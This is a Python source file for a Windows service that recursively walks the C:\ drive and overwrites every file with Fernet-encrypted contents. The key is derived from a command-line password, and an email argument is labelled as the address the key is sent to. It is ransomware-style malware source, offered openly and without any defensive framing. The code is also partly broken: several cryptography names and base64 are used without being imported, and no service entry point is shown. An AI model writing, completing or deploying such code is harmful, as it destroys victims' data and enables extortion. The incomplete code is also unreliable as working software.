import win32service
import win32serviceutil
import win32event

import argparse
import smtplib
import getpass
import os

import cryptography
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Parse the command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument("--password", "-p", required=True, help="The password to use for encrypting the files")
parser.add_argument("--email", "-e", required=True, help="The email address to send the key to")
args = parser.parse_args()

# Use the provided values for the password and email address
PASSWORD = args.password
EMAIL_ADDRESS = args.email

# Generate a random salt and use it to derive an encryption key
salt = os.urandom(16)
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=cryptography.hazmat.backends.default_backend(),
)
key = base64.urlsafe_b64encode(kdf.derive(PASSWORD.encode()))

# Create a Fernet object that can be used to encrypt and decrypt data
fernet = Fernet(key)

class MyService(win32serviceutil.ServiceFramework):
    _svc_name_ = "MyService"
    _svc_display_name_ = "My Service"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        # Scan all files in the system and encrypt them
        for root, dirs, files in os.walk("C:\\"):
            for filename in files:
                # Read the file contents into memory
                filepath = os.path.join(root, filename)
                with open(filepath, "rb") as f:
                    data = f.read()

                # Encrypt the data using the Fernet object
                encrypted_data = fernet.encrypt(data)

                # Overwrite the original file with the encrypted data
                with open(filepath, "wb") as f:
                    f.write(encrypted_data)
                    


       
